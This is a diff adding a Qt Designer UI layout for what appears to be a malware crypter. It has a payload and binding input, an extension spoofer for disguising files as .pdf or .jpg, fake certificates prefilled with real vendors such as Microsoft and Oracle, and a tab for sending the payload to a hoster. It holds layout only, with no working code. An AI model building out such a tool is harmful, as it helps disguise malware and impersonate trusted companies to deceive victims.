@@ -1,0 +1,1248 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<ui version="4.0">
+ <class>Widget</class>
+ <widget class="QWidget" name="Widget">
+  <property name="geometry">
+   <rect>
+    <x>0</x>
+    <y>0</y>
+    <width>731</width>
+    <height>769</height>
+   </rect>
+  </property>
+  <property name="windowTitle">
+   <string>Widget</string>
+  </property>
+  <property name="styleSheet">
+   <string notr="true">QLineEdit,
+QComboBox,
+QDateTimeEdit,
+QSpinBox,
+QDoubleSpinBox {
+  color: #1de9b6;
+  background-color: #31363b;
+  border: 2px solid #1de9b6;
+  border-radius: 4px;
+  height: 32px;
+}
+
+QWidget {
+  background-color: #232629;
+  color: #ffffff;
+}
+
+QGroupBox,
+QFrame {
+  background-color: #232629;
+  border: 2px solid #4f5b62;
+  border-radius: 4px;
+}
+
+QRadioButton::indicator,
+QCheckBox::indicator {
+  width: 16px;
+  height: 16px;
+  border: 2px solid #1de9b6;
+  border-radius: 0;
+  transform: rotate(45deg);
+  transform-origin: center;
+}
+
+QRadioButton::indicator:checked,
+QCheckBox::indicator:checked {
+  background-color: #1de9b6;
+  border-color: #1de9b6;
+}
+
+QRadioButton::indicator:hover,
+QCheckBox::indicator:hover {
+  border-color: rgba(29, 233, 182, 0.8);
+}
+
+QRadioButton::indicator:checked:hover,
+QCheckBox::indicator:checked:hover {
+  border-color: #1de9b6;
+}</string>
+  </property>
+  <widget class="QTextEdit" name="payload_path_textedit">
+   <property name="geometry">
+    <rect>
+     <x>20</x>
+     <y>20</y>
+     <width>341</width>
+     <height>21</height>
+    </rect>
+   </property>
+   <property name="verticalScrollBarPolicy">
+    <enum>Qt::ScrollBarAlwaysOff</enum>
+   </property>
+   <property name="horizontalScrollBarPolicy">
+    <enum>Qt::ScrollBarAlwaysOff</enum>
+   </property>
+  </widget>
+  <widget class="QFrame" name="current_stats_QFrame">
+   <property name="geometry">
+    <rect>
+     <x>20</x>
+     <y>80</y>
+     <width>301</width>
+     <height>161</height>
+    </rect>
+   </property>
+   <property name="frameShape">
+    <enum>QFrame::StyledPanel</enum>
+   </property>
+   <property name="frameShadow">
+    <enum>QFrame::Raised</enum>
+   </property>
+   <widget class="QTextEdit" name="current_stats_QFrame_textEdit">
+    <property name="geometry">
+     <rect>
+      <x>0</x>
+      <y>0</y>
+      <width>301</width>
+      <height>161</height>
+     </rect>
+    </property>
+   </widget>
+  </widget>
+  <widget class="QLabel" name="label">
+   <property name="geometry">
+    <rect>
+     <x>110</x>
+     <y>60</y>
+     <width>131</width>
+     <height>16</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Current Stats Display</string>
+   </property>
+  </widget>
+  <widget class="QCheckBox" name="checkBox_6">
+   <property name="geometry">
+    <rect>
+     <x>330</x>
+     <y>230</y>
+     <width>78</width>
+     <height>22</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>CheckBox</string>
+   </property>
+  </widget>
+  <widget class="QCheckBox" name="custom_icon_option_checkBox">
+   <property name="geometry">
+    <rect>
+     <x>330</x>
+     <y>140</y>
+     <width>121</width>
+     <height>22</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Custom Icon</string>
+   </property>
+  </widget>
+  <widget class="QCheckBox" name="self_hosting_checkBox">
+   <property name="geometry">
+    <rect>
+     <x>330</x>
+     <y>170</y>
+     <width>121</width>
+     <height>22</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Self Hosting</string>
+   </property>
+  </widget>
+  <widget class="QCheckBox" name="extspoof_option_checkBox">
+   <property name="geometry">
+    <rect>
+     <x>330</x>
+     <y>110</y>
+     <width>131</width>
+     <height>22</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Extension Spoofer</string>
+   </property>
+  </widget>
+  <widget class="QCheckBox" name="ev_certificate_option_checkBox">
+   <property name="geometry">
+    <rect>
+     <x>330</x>
+     <y>80</y>
+     <width>131</width>
+     <height>22</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Custom Certificate</string>
+   </property>
+  </widget>
+  <widget class="QCheckBox" name="checkBox_4">
+   <property name="geometry">
+    <rect>
+     <x>330</x>
+     <y>200</y>
+     <width>78</width>
+     <height>22</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>CheckBox</string>
+   </property>
+  </widget>
+  <widget class="QTextEdit" name="payload_binding_textEdit">
+   <property name="geometry">
+    <rect>
+     <x>20</x>
+     <y>260</y>
+     <width>341</width>
+     <height>21</height>
+    </rect>
+   </property>
+   <property name="verticalScrollBarPolicy">
+    <enum>Qt::ScrollBarAlwaysOff</enum>
+   </property>
+   <property name="horizontalScrollBarPolicy">
+    <enum>Qt::ScrollBarAlwaysOff</enum>
+   </property>
+  </widget>
+  <widget class="QPushButton" name="payload_binding_pushButton">
+   <property name="geometry">
+    <rect>
+     <x>370</x>
+     <y>260</y>
+     <width>71</width>
+     <height>24</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Bind with</string>
+   </property>
+  </widget>
+  <widget class="QPushButton" name="payload_path_pushButton">
+   <property name="geometry">
+    <rect>
+     <x>370</x>
+     <y>20</y>
+     <width>71</width>
+     <height>24</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Payload</string>
+   </property>
+  </widget>
+  <widget class="QTabWidget" name="features_qtabwidget">
+   <property name="enabled">
+    <bool>true</bool>
+   </property>
+   <property name="geometry">
+    <rect>
+     <x>10</x>
+     <y>530</y>
+     <width>711</width>
+     <height>201</height>
+    </rect>
+   </property>
+   <property name="statusTip">
+    <string/>
+   </property>
+   <property name="tabShape">
+    <enum>QTabWidget::Triangular</enum>
+   </property>
+   <property name="currentIndex">
+    <number>3</number>
+   </property>
+   <widget class="QWidget" name="custom_certificate_tab_settings">
+    <attribute name="title">
+     <string>Custom Certificate</string>
+    </attribute>
+    <widget class="QComboBox" name="certificate_common_name_comboBox">
+     <property name="geometry">
+      <rect>
+       <x>50</x>
+       <y>10</y>
+       <width>161</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="statusTip">
+      <string>Common Name (CN): Represents the server name protected by the SSL certificate.\nThe certificate is valid only if the request hostname matches the certificate common name. Most web browsers display a warning message when connecting to an address that does not match the common name in the certificate.</string>
+     </property>
+     <property name="whatsThis">
+      <string>Common Name (CN): Represents the server name protected by the SSL certificate.
+The certificate is valid only if the request hostname matches the certificate common name. Most web browsers display a warning message when connecting to an address that does not match the common name in the certificate.</string>
+     </property>
+     <property name="editable">
+      <bool>true</bool>
+     </property>
+     <item>
+      <property name="text">
+       <string/>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>www.oracle.com</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>www.microsoft.com</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>www.github.com</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>www.atlassian.com</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>www.zoom.us</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>slack.com</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>www.salesforce.com</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>www.adobe.com</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>www.vmware.com</string>
+      </property>
+     </item>
+    </widget>
+    <widget class="QComboBox" name="certificate_orginization_comboBox">
+     <property name="geometry">
+      <rect>
+       <x>50</x>
+       <y>40</y>
+       <width>161</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="statusTip">
+      <string>Organization (O):</string>
+     </property>
+     <property name="whatsThis">
+      <string>Organization (O):</string>
+     </property>
+     <property name="editable">
+      <bool>true</bool>
+     </property>
+     <item>
+      <property name="text">
+       <string/>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Microsoft Corporation</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Oracle Corporation</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Adobe Systems Incorporated</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>GitHub Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Atlassian Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Zoom Video Communications, Inc.</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Slack Technologies, Inc.</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Salesforce.com, Inc.</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>VMware, Inc.</string>
+      </property>
+     </item>
+    </widget>
+    <widget class="QComboBox" name="certificate_organizational_unit_comboBox">
+     <property name="geometry">
+      <rect>
+       <x>50</x>
+       <y>70</y>
+       <width>161</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="statusTip">
+      <string>Organizational Unit (OU):</string>
+     </property>
+     <property name="whatsThis">
+      <string>Organizational Unit (OU):</string>
+     </property>
+     <property name="editable">
+      <bool>true</bool>
+     </property>
+     <item>
+      <property name="text">
+       <string/>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Microsoft Corporation</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Oracle Global Digital Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Adobe Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>GitHub Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Atlassian Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Zoom Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Slack Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Salesforce Certificate Authority</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>VMware Certificate Authority</string>
+      </property>
+     </item>
+    </widget>
+    <widget class="QComboBox" name="certificate_locality_comboBox">
+     <property name="geometry">
+      <rect>
+       <x>260</x>
+       <y>70</y>
+       <width>101</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="statusTip">
+      <string>Locality (L):</string>
+     </property>
+     <property name="whatsThis">
+      <string>Locality (L):</string>
+     </property>
+     <property name="editable">
+      <bool>true</bool>
+     </property>
+     <item>
+      <property name="text">
+       <string/>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Redmond</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Ottawa</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Berlin</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Tokyo</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Brasília</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Canberra</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>New Delhi</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Pretoria (administrative capital)</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Paris</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Mexico City</string>
+      </property>
+     </item>
+    </widget>
+    <widget class="QComboBox" name="state_certificate_comboBox">
+     <property name="geometry">
+      <rect>
+       <x>260</x>
+       <y>40</y>
+       <width>101</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="statusTip">
+      <string>State (ST):</string>
+     </property>
+     <property name="whatsThis">
+      <string>State (ST):</string>
+     </property>
+     <property name="editable">
+      <bool>true</bool>
+     </property>
+     <item>
+      <property name="text">
+       <string/>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Washington, D.C.</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Ottawa</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Berlin</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Tokyo</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Brasília</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Canberra</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>New Delhi</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Pretoria</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Paris</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>Mexico City</string>
+      </property>
+     </item>
+    </widget>
+    <widget class="QComboBox" name="certificate_country_comboBox">
+     <property name="geometry">
+      <rect>
+       <x>260</x>
+       <y>10</y>
+       <width>101</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="statusTip">
+      <string>Country (C):</string>
+     </property>
+     <property name="whatsThis">
+      <string>Country (C):</string>
+     </property>
+     <property name="editable">
+      <bool>true</bool>
+     </property>
+     <item>
+      <property name="text">
+       <string/>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>US</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>CA</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>GR</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>JP</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>BR</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>AU</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>IN</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>SA</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>FR</string>
+      </property>
+     </item>
+     <item>
+      <property name="text">
+       <string>MX</string>
+      </property>
+     </item>
+    </widget>
+    <widget class="QLabel" name="certificate_common_name_label">
+     <property name="geometry">
+      <rect>
+       <x>18</x>
+       <y>10</y>
+       <width>31</width>
+       <height>20</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>CN:</string>
+     </property>
+    </widget>
+    <widget class="QLabel" name="certificate_orginization_label">
+     <property name="geometry">
+      <rect>
+       <x>20</x>
+       <y>40</y>
+       <width>31</width>
+       <height>20</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>O:</string>
+     </property>
+    </widget>
+    <widget class="QLabel" name="certificate_organizational_unit_label">
+     <property name="geometry">
+      <rect>
+       <x>20</x>
+       <y>70</y>
+       <width>31</width>
+       <height>21</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>OU:</string>
+     </property>
+    </widget>
+    <widget class="QLabel" name="certificate_country_label">
+     <property name="geometry">
+      <rect>
+       <x>230</x>
+       <y>10</y>
+       <width>21</width>
+       <height>20</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>C:</string>
+     </property>
+    </widget>
+    <widget class="QLabel" name="label_7">
+     <property name="geometry">
+      <rect>
+       <x>230</x>
+       <y>40</y>
+       <width>21</width>
+       <height>20</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>ST:</string>
+     </property>
+    </widget>
+    <widget class="QLabel" name="label_8">
+     <property name="geometry">
+      <rect>
+       <x>230</x>
+       <y>70</y>
+       <width>21</width>
+       <height>20</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>L:</string>
+     </property>
+    </widget>
+    <widget class="QPushButton" name="sign_certificate_pushButton">
+     <property name="geometry">
+      <rect>
+       <x>100</x>
+       <y>140</y>
+       <width>181</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>Sign Certificate</string>
+     </property>
+    </widget>
+    <widget class="QTextEdit" name="custom_certificate_console_textEdit">
+     <property name="geometry">
+      <rect>
+       <x>370</x>
+       <y>10</y>
+       <width>321</width>
+       <height>151</height>
+      </rect>
+     </property>
+    </widget>
+    <widget class="QDateEdit" name="dateEdit">
+     <property name="geometry">
+      <rect>
+       <x>70</x>
+       <y>100</y>
+       <width>81</width>
+       <height>31</height>
+      </rect>
+     </property>
+     <property name="minimumDateTime">
+      <datetime>
+       <hour>4</hour>
+       <minute>0</minute>
+       <second>0</second>
+       <year>2024</year>
+       <month>9</month>
+       <day>14</day>
+      </datetime>
+     </property>
+     <property name="maximumDate">
+      <date>
+       <year>2050</year>
+       <month>12</month>
+       <day>31</day>
+      </date>
+     </property>
+    </widget>
+    <widget class="QDateEdit" name="dateEdit_2">
+     <property name="geometry">
+      <rect>
+       <x>240</x>
+       <y>100</y>
+       <width>81</width>
+       <height>31</height>
+      </rect>
+     </property>
+     <property name="toolTipDuration">
+      <number>-1</number>
+     </property>
+     <property name="minimumDateTime">
+      <datetime>
+       <hour>0</hour>
+       <minute>0</minute>
+       <second>0</second>
+       <year>2026</year>
+       <month>9</month>
+       <day>14</day>
+      </datetime>
+     </property>
+     <property name="maximumDate">
+      <date>
+       <year>2050</year>
+       <month>12</month>
+       <day>31</day>
+      </date>
+     </property>
+     <property name="minimumDate">
+      <date>
+       <year>2026</year>
+       <month>9</month>
+       <day>14</day>
+      </date>
+     </property>
+    </widget>
+    <widget class="QLabel" name="label_2">
+     <property name="geometry">
+      <rect>
+       <x>20</x>
+       <y>100</y>
+       <width>49</width>
+       <height>31</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>From:</string>
+     </property>
+    </widget>
+    <widget class="QLabel" name="label_3">
+     <property name="geometry">
+      <rect>
+       <x>200</x>
+       <y>100</y>
+       <width>41</width>
+       <height>31</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>Till:</string>
+     </property>
+    </widget>
+   </widget>
+   <widget class="QWidget" name="extension_spoofer_tab_settings">
+    <attribute name="title">
+     <string>Extension Spoofer</string>
+    </attribute>
+    <widget class="QCheckBox" name="extspoof_xlxs_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>380</x>
+       <y>10</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.xlxs</string>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_pdf_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>380</x>
+       <y>30</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.pdf</string>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_jpg_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>380</x>
+       <y>50</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.jpg</string>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_jpeg_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>380</x>
+       <y>70</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.jpeg</string>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_php_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>380</x>
+       <y>110</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.php</string>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_slx_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>380</x>
+       <y>130</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.slx</string>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_doc_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>380</x>
+       <y>90</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.doc</string>
+     </property>
+    </widget>
+    <widget class="QFrame" name="extspoof_console_frame">
+     <property name="geometry">
+      <rect>
+       <x>440</x>
+       <y>10</y>
+       <width>261</width>
+       <height>141</height>
+      </rect>
+     </property>
+     <property name="frameShape">
+      <enum>QFrame::StyledPanel</enum>
+     </property>
+     <property name="frameShadow">
+      <enum>QFrame::Raised</enum>
+     </property>
+    </widget>
+    <widget class="QPushButton" name="pushButton">
+     <property name="geometry">
+      <rect>
+       <x>270</x>
+       <y>130</y>
+       <width>80</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>Spoof It</string>
+     </property>
+    </widget>
+    <widget class="QTextEdit" name="extspoof_filepath_textEdit">
+     <property name="geometry">
+      <rect>
+       <x>10</x>
+       <y>10</y>
+       <width>231</width>
+       <height>21</height>
+      </rect>
+     </property>
+     <property name="verticalScrollBarPolicy">
+      <enum>Qt::ScrollBarAlwaysOff</enum>
+     </property>
+     <property name="horizontalScrollBarPolicy">
+      <enum>Qt::ScrollBarAlwaysOff</enum>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_pif_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>310</x>
+       <y>10</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.pif</string>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_lnk_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>310</x>
+       <y>30</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.lnk</string>
+     </property>
+    </widget>
+    <widget class="QCheckBox" name="extspoof_bat_checkBox">
+     <property name="geometry">
+      <rect>
+       <x>310</x>
+       <y>50</y>
+       <width>61</width>
+       <height>22</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>.bat</string>
+     </property>
+    </widget>
+   </widget>
+   <widget class="QWidget" name="custom_icon_tab_settings">
+    <attribute name="title">
+     <string>Custom Icon Settings</string>
+    </attribute>
+    <widget class="QPushButton" name="upload_icon_pushButton">
+     <property name="geometry">
+      <rect>
+       <x>260</x>
+       <y>20</y>
+       <width>80</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>Upload Icon</string>
+     </property>
+    </widget>
+    <widget class="QFrame" name="icon_frame">
+     <property name="geometry">
+      <rect>
+       <x>359</x>
+       <y>10</y>
+       <width>161</width>
+       <height>121</height>
+      </rect>
+     </property>
+     <property name="frameShape">
+      <enum>QFrame::StyledPanel</enum>
+     </property>
+     <property name="frameShadow">
+      <enum>QFrame::Raised</enum>
+     </property>
+    </widget>
+    <widget class="QTextEdit" name="custom_icon_textEdit">
+     <property name="geometry">
+      <rect>
+       <x>10</x>
+       <y>20</y>
+       <width>241</width>
+       <height>21</height>
+      </rect>
+     </property>
+     <property name="verticalScrollBarPolicy">
+      <enum>Qt::ScrollBarAlwaysOff</enum>
+     </property>
+     <property name="horizontalScrollBarPolicy">
+      <enum>Qt::ScrollBarAlwaysOff</enum>
+     </property>
+    </widget>
+   </widget>
+   <widget class="QWidget" name="host_it_tab">
+    <attribute name="title">
+     <string>Host It</string>
+    </attribute>
+    <widget class="QComboBox" name="send_to_hosting_provider_comboBox">
+     <property name="geometry">
+      <rect>
+       <x>10</x>
+       <y>40</y>
+       <width>271</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="currentText">
+      <string/>
+     </property>
+     <property name="placeholderText">
+      <string>Hosting Provider of Choice</string>
+     </property>
+    </widget>
+    <widget class="QFrame" name="frame">
+     <property name="geometry">
+      <rect>
+       <x>380</x>
+       <y>10</y>
+       <width>311</width>
+       <height>151</height>
+      </rect>
+     </property>
+     <property name="frameShape">
+      <enum>QFrame::StyledPanel</enum>
+     </property>
+     <property name="frameShadow">
+      <enum>QFrame::Raised</enum>
+     </property>
+    </widget>
+    <widget class="QPushButton" name="send_to_hosting_pushButton">
+     <property name="geometry">
+      <rect>
+       <x>190</x>
+       <y>130</y>
+       <width>161</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>Send To Hoster</string>
+     </property>
+    </widget>
+    <widget class="QTextEdit" name="send_to_hosting_file_textEdit">
+     <property name="geometry">
+      <rect>
+       <x>10</x>
+       <y>10</y>
+       <width>271</width>
+       <height>21</height>
+      </rect>
+     </property>
+     <property name="verticalScrollBarPolicy">
+      <enum>Qt::ScrollBarAlwaysOff</enum>
+     </property>
+     <property name="horizontalScrollBarPolicy">
+      <enum>Qt::ScrollBarAlwaysOff</enum>
+     </property>
+    </widget>
+    <widget class="QPushButton" name="send_to_hosting_select_payload_pushButton">
+     <property name="geometry">
+      <rect>
+       <x>290</x>
+       <y>10</y>
+       <width>81</width>
+       <height>24</height>
+      </rect>
+     </property>
+     <property name="text">
+      <string>Select Payload</string>
+     </property>
+    </widget>
+   </widget>
+  </widget>
+  <widget class="QPushButton" name="process_crypting_pushButton">
+   <property name="geometry">
+    <rect>
+     <x>210</x>
+     <y>730</y>
+     <width>311</width>
+     <height>31</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Process Crypting</string>
+   </property>
+  </widget>
+  <widget class="QTextEdit" name="binding_console_textEdit">
+   <property name="geometry">
+    <rect>
+     <x>20</x>
+     <y>290</y>
+     <width>401</width>
+     <height>221</height>
+    </rect>
+   </property>
+  </widget>
+  <widget class="QTextEdit" name="settings_totality_textEdit">
+   <property name="geometry">
+    <rect>
+     <x>460</x>
+     <y>60</y>
+     <width>261</width>
+     <height>471</height>
+    </rect>
+   </property>
+  </widget>
+  <widget class="QLabel" name="settings_totality_label">
+   <property name="geometry">
+    <rect>
+     <x>550</x>
+     <y>40</y>
+     <width>101</width>
+     <height>16</height>
+    </rect>
+   </property>
+   <property name="text">
+    <string>Settings Totality</string>
+   </property>
+  </widget>
+ </widget>
+ <resources/>
+ <connections/>
+</ui>
